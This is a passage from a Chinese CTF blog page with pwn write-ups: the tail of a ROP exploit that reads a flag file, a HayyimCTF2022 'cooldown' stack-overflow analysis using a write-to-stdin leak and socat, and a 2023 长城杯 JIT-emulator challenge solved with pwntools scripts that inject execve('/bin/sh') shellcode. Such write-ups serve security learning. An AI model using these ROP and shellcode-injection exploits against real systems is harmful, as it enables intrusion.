class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x40</span>) + p64(ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">note(<span class="number">0xa8</span>, payload)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x401CA3&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># heap + 0x70</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xffffff9C</span>) + p64(pop_rsi) + p64(heap + <span class="number">0x70</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">257</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(heap) + p64(puts)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="固件部分"><a href="#固件部分" class="headerlink" title="固件部分"></a>固件部分</h1><h2 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a>NodeMCU</h2><p>签到题，解压出固件后直接cat就有</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/05/18/HayyimCTF2022-cooldown/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/18/HayyimCTF2022-cooldown/" class="post-title-link" itemprop="url">HayyimCTF2022-cooldown</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-05-18 15:28:08 / 修改时间：19:50:03" itemprop="dateCreated datePublished" datetime="2023-05-18T15:28:08+08:00">2023-05-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>程序保护如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec Cooldown</span></span><br><span class="line">[*] &#x27;/home/charon/Desktop/ChuTi/Cooldown&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure>

<p>源码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>);</span><br><span class="line">	write(<span class="number">1</span>, <span class="string">&quot;&gt; &quot;</span>, <span class="number">2</span>);</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	init();</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进IDA里看如下</p>
<p>程序实际上是从start函数开始（或者说是跳过了start函数直接从main开始？）</p>
<img src="/2023/05/18/HayyimCTF2022-cooldown/start.jpg" class>

<img src="/2023/05/18/HayyimCTF2022-cooldown/vuln-1.jpg" class>

<p>不知道是怎么编译得这么干净的，整个程序中都没有什么多余的东西</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ropper -f Cooldown</span> </span><br><span class="line">[INFO] Load gadgets for section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line"></span><br><span class="line">Gadgets</span><br><span class="line">=======</span><br><span class="line"></span><br><span class="line">0x0000000000400534: add byte ptr [rax + 0x31], bl; imul cl; cmp edi, -1; call qword ptr [rbx + 0x31]; </span><br><span class="line">0x0000000000400532: add byte ptr [rax], al; add byte ptr [rax + 0x31], bl; imul cl; cmp edi, -1; call qword ptr [rbx + 0x31]; </span><br><span class="line">0x0000000000400579: add esp, 0x30; pop rbx; ret; </span><br><span class="line">0x0000000000400578: add rsp, 0x30; pop rbx; ret; </span><br><span class="line">0x0000000000400573: call 0x24b0; add rsp, 0x30; pop rbx; ret; </span><br><span class="line">0x0000000000400623: call qword ptr [rax]; </span><br><span class="line">0x000000000040053c: call qword ptr [rbx + 0x31]; </span><br><span class="line">0x0000000000400539: cmp edi, -1; call qword ptr [rbx + 0x31]; </span><br><span class="line">0x0000000000400537: imul cl; cmp edi, -1; call qword ptr [rbx + 0x31]; </span><br><span class="line">0x000000000040057c: pop rbx; ret; </span><br><span class="line">0x0000000000400571: xor eax, eax; call 0x24b0; add rsp, 0x30; pop rbx; ret; </span><br><span class="line">0x000000000040056f: xor edi, edi; xor eax, eax; call 0x24b0; add rsp, 0x30; pop rbx; ret; </span><br><span class="line">0x000000000040057d: ret; </span><br><span class="line"></span><br><span class="line">13 gadgets found</span><br></pre></td></tr></table></figure>

<p>且vuln函数的汇编实现如下，而且整体是用rbx来保存栈底、最后用<code>add rsp, 0x30; pop rbx;</code>来调整栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040053D ; ssize_t sub_40053D()</span><br><span class="line">.text:000000000040053D sub_40053D      proc near               ; CODE XREF: start+D↑p</span><br><span class="line">.text:000000000040053D ; __unwind &#123;</span><br><span class="line">.text:000000000040053D                 push    rbx</span><br><span class="line">.text:000000000040053E                 xor     eax, eax</span><br><span class="line">.text:0000000000400540                 mov     ecx, 0Ch</span><br><span class="line">.text:0000000000400545                 lea     rsi, asc_40057E ; buf</span><br><span class="line">.text:000000000040054C                 mov     edx, 2          ; n</span><br><span class="line">.text:0000000000400551                 sub     rsp, 30h</span><br><span class="line">.text:0000000000400555                 mov     rbx, rsp</span><br><span class="line">.text:0000000000400558                 mov     rdi, rbx</span><br><span class="line">.text:000000000040055B                 rep stosd</span><br><span class="line">.text:000000000040055D                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000400562                 call    _write</span><br><span class="line">.text:0000000000400567                 mov     rsi, rbx        ; buf</span><br><span class="line">.text:000000000040056A                 mov     edx, 60h ; &#x27;`&#x27;  ; nbytes</span><br><span class="line">.text:000000000040056F                 xor     edi, edi        ; fd</span><br><span class="line">.text:0000000000400571                 xor     eax, eax</span><br><span class="line">.text:0000000000400573                 call    _read</span><br><span class="line">.text:0000000000400578                 add     rsp, 30h</span><br><span class="line">.text:000000000040057C                 pop     rbx</span><br><span class="line">.text:000000000040057D                 retn</span><br><span class="line">.text:000000000040057D ; &#125; // starts at 40053D</span><br><span class="line">.text:000000000040057D sub_40053D      endp</span><br><span class="line">.text:000000000040057D</span><br><span class="line">.text:000000000040057D _text           ends</span><br><span class="line">.text:000000000040057D</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先输入任意数据打断点到read结束后观察一下栈</p>
<img src="/2023/05/18/HayyimCTF2022-cooldown/stack-1.jpg" class>

<p>可以看到正常的返回地址后面是一个ld的地址，而且由目前<code>r12</code>的值来看，如果把返回地址拉成这个地址，那么会让程序返回到main函数的起始位置重新开始。</p>
<img src="/2023/05/18/HayyimCTF2022-cooldown/stack-2.jpg" class>

<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/32312">ctftime中的一个wp</a>中的思路是直接把返回地址盖成<code>elf.plt[&#39;write&#39;]</code>，那么从流程来看就会先调用<code>write(0, buf, 0x60)</code>，然后接上栈上的那个ld地址再返回到main函数。</p>
<p>而在调用<code>write(0, buf, 0x60)</code>这个点时则会把栈上的那个ld地址也泄露出来，由此获得libc，一个比较让人疑惑的点是write函数在这里是往标准输入扔数据，能够造成泄露吗？对此wp中说</p>
<blockquote>
<p><em>But <code>rdi</code> is <code>0</code> not <code>1</code>, isn’t <code>0</code> <code>stdin</code>?</em></p>
<p>Yes it is, but these are just conventions. From your shell type <code>echo nothing &gt;&amp;0</code>, see, you got <code>nothing</code>, which is actually <em>something</em>.</p>
</blockquote>
<p>其简单陈述了一个事实，但没有解释为什么</p>
<p>另一个wp中说</p>
<blockquote>
<p>it basically call write function in plt, the filedescriptor will be 0 after the read call (stdin so)..</p>
<p>but it will work remotely, as in general the filedescriptor remotely is a socket, and writing to stdin will work remotely..(old trick)</p>
</blockquote>
<p>目前还没看懂（这是计网的内容吗）</p>
<p>在本地的shell中做个实验，可以发现往标准输入扔数据确实也能得到一个输出</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> nothing &gt;&amp;0</span></span><br><span class="line">nothing</span><br></pre></td></tr></table></figure>

<p>在程序中写个demo尝试一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	write(<span class="number">0</span>, <span class="string">&quot;nothing&quot;</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现确实也能输出</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./a.out</span> </span><br><span class="line">nothing</span><br></pre></td></tr></table></figure>

<p>所以基于这个事实，wp中的思路应该就是最简单可行的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*56 + p64(elf.plt[&#x27;write&#x27;])</span><br></pre></td></tr></table></figure>

<p>但是在本地进行测试时发现虽然确实执行了write函数，但是并不会接收到输出</p>
<img src="/2023/05/18/HayyimCTF2022-cooldown/exp-1.jpg" class>

<p>对此wp中提到pwntools的<code>process</code>不能很好地处理写入fd为0的输出，所以这就是为什么本地接收不到输出</p>
<p>其选择的解决方法是用<code>socat</code>起一个TCP连接，然后再用<code>remote</code>连过去，如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = context.binary = ELF(<span class="string">&#x27;./Cooldown&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">s = process(<span class="string">&#x27;socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./Cooldown,pty,setsid,sigint,sane,rawer&#x27;</span>.split())</span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br></pre></td></tr></table></figure>

<p>在此之前我没有了解过计网和socat的相关内容，所以这里只简单了解一下这部分命令参数</p>
<ol>
<li><p><code>socat</code> 是一种功能强大的网络工具，用于在两个数据流之间建立连接和传输数据。它可以在不同的网络协议之间进行数据转换和转发，提供了灵活的配置选项和丰富的功能。</p>
</li>
<li><p><code>TCP-LISTEN:9999</code>：让<code>socat</code>在本地的9999端口上起一个TCP监听器，由此可以监听传入的TCP连接</p>
</li>
<li><p><code>reuseaddr</code> ：用于在端口处于 TIME_WAIT 状态时允许立即重用地址（端口），在关闭一个TCP连接时，它会经历一系列状态转换，其中一个状态就是<code>TIME_WAIT</code>。简单来说，它的存在是为了确保在网络中所有相关的数据包都已被接收和处理，以便完整地关闭连接。</p>
</li>
<li><p><code>fork</code>：对于每个传入连接，派生一个子进程以处理连接。这样可以允许同时处理多个连接。</p>
<p><code>fork</code> 选项在 <code>socat</code> 中有一个重要的作用：对于每一个新的入站连接，它都会复制一个新的 <code>socat</code> 进程。这就意味着你可以同时处理多个连接，因为每个连接都有自己的 <code>socat</code> 进程和 <code>Cooldown</code> 程序实例。没有 <code>fork</code> 选项，<code>socat</code> 只能同时处理一个连接，新的连接将不得不等待直到先前的连接关闭。</p>
<p>这个功能在很多场景下都非常有用，尤其是在需要服务大量并发连接的服务器上。例如，如果你正在运行一个 HTTP 服务器，那么使用 <code>fork</code> 选项可以确保服务器能同时处理多个客户端的请求，而不是一次只处理一个请求。</p>
</li>
<li><p><code>EXEC:./Cooldown</code>：当有连接建立时，执行 <code>./Cooldown</code> 程序。这里的 <code>./Cooldown</code> 可能是一个可执行文件或脚本，将被执行并与建立连接的客户端进行通信。</p>
</li>
</ol>
<p>剩下的几个就是一些比较细节的参数：</p>
<ol>
<li><code>pty</code>：让socat设置一个伪终端，用于在进程间提供类似终端的交互通信方式</li>
<li><code>setsid</code>: 此选项使 socat 成为一个新的会话组的领导者。会话组是一个或多个进程的集合，它们在同一个终端上交互并共享相同的会话上下文。通过使用 <code>setsid</code>，socat 在一个新的会话组中运行，独立于任何现有的终端会话。</li>
<li><code>sigint</code>: 此选项允许 socat 捕获并处理中断信号（SIGINT）。SIGINT 通常由终端发送，用于请求中断或终止进程的执行。通过使用 <code>sigint</code>，socat 可以在接收到中断信号时执行特定的处理操作。</li>
<li><code>sane</code>: 此选项指示 socat 设置终端模式为“sane”模式。在“sane”模式下，终端将被设置为一组合理的默认配置，包括行编辑、回显和信号处理。这有助于确保与 socat 关联的伪终端在使用时具有合适的行为。</li>
<li><code>rawer</code>: 此选项指示 socat 设置终端模式为“raw”模式。在“raw”模式下，终端将被设置为原始模式，不进行行编辑、回显或信号处理。这意味着输入和输出数据将以原始的、未经处理的形式传递。使用 <code>rawer</code> 可以更灵活地处理输入输出，适用于特殊的应用场景。</li>
</ol>
<p>如下，可以看到如预期一样，接在payload后面的八个字节就是那个ld地址</p>
<img src="/2023/05/18/HayyimCTF2022-cooldown/exp-2.jpg" class>

<p>剩下的就是ret2libc了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/30/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/30/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-pwn/" class="post-title-link" itemprop="url">2023长城杯决赛-pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-04-30 19:38:02 / 修改时间：22:16:24" itemprop="dateCreated datePublished" datetime="2023-04-30T19:38:02+08:00">2023-04-30</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总得来说决赛的pwn不算难，一共两道pwn出了相对比较难的那题，简单的那题愣是没想起来用<code>__environ</code>去泄露栈，好像不止一次了（<del>悲</del>）</p>
<h2 id="fast-emulator"><a href="#fast-emulator" class="headerlink" title="fast_emulator"></a>fast_emulator</h2><p>一道类似VM的题目（说是JIT，但是没接触过不懂）</p>
<p>题目比较友好地先给出了指令格式</p>
<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/30/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-pwn/image-20230430194538945.png" alt="image-20230430194538945"></p>
<p>往后逆向可知程序实现了add、sub、xor、div、mul、load（相当于mov）这几条指令，按照其指定的格式去输入指令，其会按行解析每条指令并且在<code>write_code()</code>函数中将指令翻译成对应汇编的机器码写进前面mmap的一段内存里，并且在后面会mprotect成<code>RX</code>的然后去执行里面的指令</p>
<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/30/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-pwn/image-20230430194920673.png" alt="image-20230430194920673"></p>
<p>最主要的洞在<code>load</code>的翻译中，如果数据部分过长是会把过长的数据也带进去的（稍微调一下就可以知道<code>0xC748</code>对的指令指令是4个字节的mov，所以需要垫4个字节的数据给这个mov，然后在后面接自己的shellcode），所以就可以利用这个点往里面写任意指令，顺着这个思路构造<code>execve(&#39;/bin/sh&#39;,0,0)</code>就行</p>
<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/30/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-pwn/image-20230430194423673.png" alt="image-20230430194423673"></p>
<p>写这题WP的主要原因是我在比赛时花了大量的时间去手撸shellcode，包括找到指令对应的机器码（因为这题需要输入16进制数字）、然后将这些机器码手写到payload里，这个过程所花费的时间实在有点长，导致了大量不必要时间的浪费（<del>不然说不定另一题也能做完</del>）</p>
<p>这是比赛时的WP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./fast&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;172.31.0.72&quot;,10000)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter the number of lines you want to enter:&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x1A1D)&#x27;) 	</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x19E0 parse_line</span></span><br><span class="line"><span class="comment"># 0x1A1D call r13</span></span><br><span class="line"><span class="comment"># 0x19EE write_code</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r1 = rax</span></span><br><span class="line"><span class="comment"># r2 = rcx</span></span><br><span class="line"><span class="comment"># r3 = rdx</span></span><br><span class="line"><span class="comment"># r4 = rbx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mov rbx, &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment"># push rbx</span></span><br><span class="line"><span class="comment"># mov rsp,rdi</span></span><br><span class="line"><span class="comment"># xor rdx,rdx</span></span><br><span class="line"><span class="comment"># xor rsi,rsi</span></span><br><span class="line"><span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;load r2, 0x530068732f6e69622fbb489011111111\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;xor r3, r3\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;load r2, 0x0000003bc0c74811111111\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;load r2, 0x050ff63148e789489011111111\n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看到payload里的机器码都是我楞写出来的</p>
<p>回来之后研究一下有没有什么简单的方法，想了想还是对python和pwntools库了解的不全面（反思）</p>
<p>下面是改进后的exp（python2中str没有<code>.hex</code>方法所以需要用<code>.encode(&#39;hex&#39;)</code>），利用<code>asm()</code>模块生成shellcode的字节码，因为题目解析的问题所以先用<code>[::-1]</code>翻转一下，然后再解码成16进制整数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./fast&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;172.31.0.72&quot;,10000)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please enter the number of lines you want to enter:&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0x1A1D)&#x27;</span>) 	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x19E0 parse_line</span></span><br><span class="line"><span class="comment"># 0x1A1D call r13</span></span><br><span class="line"><span class="comment"># 0x19EE write_code</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r1 = rax</span></span><br><span class="line"><span class="comment"># r2 = rcx</span></span><br><span class="line"><span class="comment"># r3 = rdx</span></span><br><span class="line"><span class="comment"># r4 = rbx</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;load r2, 0x&#x27;</span> + asm(<span class="string">&#x27;mov rcx, 0x68732f6e69622f;push rcx&#x27;</span>)[::-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>) + <span class="string">b&#x27;11111111\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;load r2, 0x&#x27;</span> + asm(<span class="string">&#x27;mov rdi, rsp;xor rdx,rdx;xor rsi,rsi&#x27;</span>)[::-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>) + <span class="string">b&#x27;11111111\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;load r2, 0x&#x27;</span> + asm(<span class="string">&#x27;mov rax,0x3b;syscall&#x27;</span>)[::-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>) + <span class="string">b&#x27;11111111&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在python3中payload可以如下，先将字节码按字节翻转，然后转成16进制整数，再解码成字节类型</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;load r2, 0x&#x27;</span> + asm(<span class="string">&#x27;mov rcx, 0x68732f6e69622f;push rcx&#x27;</span>)[::-<span class="number">1</span>].<span class="built_in">hex</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;11111111\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;load r2, 0x&#x27;</span> + asm(<span class="string">&#x27;mov rdi, rsp;xor rdx,rdx;xor rsi,rsi&#x27;</span>)[::-<span class="number">1</span>].<span class="built_in">hex</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)  + <span class="string">b&#x27;11111111\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;load r2, 0x&#x27;</span> + asm(<span class="string">&#x27;mov rax,0x3b;syscall&#x27;</span>)[::-<span class="number">1</span>].<span class="built_in">hex</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;11111111&#x27;</span></span><br></pre></td></tr></table></figure>

<p>该补一下python了（<del>悲</del>）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

